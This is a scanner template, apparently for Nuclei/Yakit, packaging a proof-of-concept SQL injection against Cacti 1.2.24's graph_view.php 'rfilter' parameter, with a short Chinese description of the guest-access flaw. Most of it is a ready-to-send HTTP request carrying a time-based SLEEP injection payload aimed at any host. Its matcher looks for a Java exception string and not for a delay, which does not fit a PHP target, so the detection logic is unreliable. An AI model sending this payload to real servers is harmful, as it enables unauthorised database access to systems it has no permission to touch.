# Add your nuclei formatted PoC!# Add your nuclei formatted PoC!
id: WebFuzzer-Template-bDoPGece

info:
  name: Cacti 1.2.24 - graph_view.php 'rfilter' SQL Injection (guest access)
  author: Yuanqiu
  severity: high
  description: Cacti 1.2.24 - graph_view.php 'rfilter' SQL Injection vulnerability allows an attacker to execute arbitrary SQL commands.
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 30f088c542f5f1d828b247ddf8fd5426

http:
- raw:
  - |+
    @timeout: 30s
    GET /graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=%22%20OR%20%22%22%3D%22((%22));SELECT%20SLEEP(10);--%20- HTTP/1.1
    Host: {{Hostname}}
  max-redirects: 3
  matchers-condition: and
  matchers:
  - id: 1
    type: word
    part: body
    words:
    - "java.lang.reflect.InvocationTargetException"
    condition: and
help:
Cacti是Cacti团队的一套开源的网络流量监测和分析工具。该工具通过snmpget来获取数据，使用RRDtool绘画图形进行分析，并提供数据和用户管理功能。
Cacti 存在SQL注入漏洞，该漏洞源于默认情况下，访客用户可以在不经过身份验证的情况下访问graph_view.php。
author: YuanQiu-ke
